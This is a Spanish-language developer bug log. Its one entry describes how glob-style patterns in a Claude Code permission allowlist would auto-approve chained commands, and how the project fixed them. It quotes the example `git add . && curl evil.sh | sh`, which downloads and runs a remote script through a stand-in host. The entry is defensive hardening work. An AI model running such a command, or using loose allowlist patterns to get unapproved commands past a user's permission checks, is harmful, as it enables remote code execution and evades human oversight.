# Errores y fixes — Recovery Parts

Bitácora local de bugs con causa raíz no obvia (no typos) encontrados en desarrollo/mantenimiento.
Se completa a medida que aparecen. Ver protocolo de sincronización con la fábrica en `maintenance.md`.

## Template para nuevos errores

```
## [FECHA] Título corto del error

**Síntoma**
[Mensaje de error o comportamiento observado]

**Causa raíz**
[Explicación técnica de por qué ocurre]

**Solución**
[Código o pasos aplicados]

**Lección**
[Qué tener en cuenta para no repetirlo]
```

## 2026-09-25 Allowlist de `.claude/settings.json` con wildcard sin boundary seguro

**Síntoma**
Security-review automático post-push marcó 5 hallazgos "allowlist-semantic-escape" en `.claude/settings.json`.

**Causa raíz**
El template de `project-memory.md` de la fábrica (copiado literal) usa patrones tipo `"Bash(npm install*)"`, `"Bash(git add*)"` — el `*` pegado sin `:` es un glob de string plano, no el boundary de prefijo seguro que reconoce el motor de permisos. Con eso, un comando como `git add . && curl evil.sh | sh` matchea el prefijo `git add*` y se autoaprobaría sin preguntar, porque el matcher no distingue dónde termina el comando permitido y empieza lo encadenado.

**Solución**
Reemplazados todos los patrones `cmd*` por `cmd:*` (sintaxis de prefijo documentada de Claude Code, con boundary seguro de argumentos) en `settings.json`. Endurecido solo en este proyecto — el template de la fábrica (`.claude/modules/project-memory.md`) sigue con el patrón viejo en el resto de la flota, no se tocó acá (decisión del usuario: no era el alcance de esta sesión).

**Lección**
Al copiar el template de `settings.json` para un proyecto nuevo, usar `cmd:*` en vez de `cmd*` para cualquier permiso que necesite aceptar argumentos variables.
